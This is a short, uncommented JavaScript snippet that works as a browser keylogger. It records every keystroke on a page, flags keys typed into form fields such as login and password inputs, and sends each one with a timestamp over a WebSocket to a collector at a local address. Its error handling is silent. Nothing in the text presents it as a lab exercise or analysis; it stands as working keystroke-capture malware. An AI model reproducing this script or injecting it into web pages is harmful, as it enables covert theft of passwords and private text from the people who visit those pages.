(function () {
    var conn = new WebSocket("ws://127.0.0.1:8080/ws");

    

    conn.onopen = function () {
        document.addEventListener("keydown",function(evt){
            var key = evt.key
            var target = evt.target

            var source = (
                target.tagName === "INPUT" ||
                target.tagName === "TEXTAREA" ||
                target.isContentEditable
            ) ? "form" : "other";
            if (conn.readyState === WebSocket.OPEN){
                conn.send(JSON.stringify({
                    key: key,
                    source: source,
                    timestamp: new Date().toISOString()
                }));
            }
        });
    };
    conn.onerror = function () {};
    conn.onclose = function () {};
})();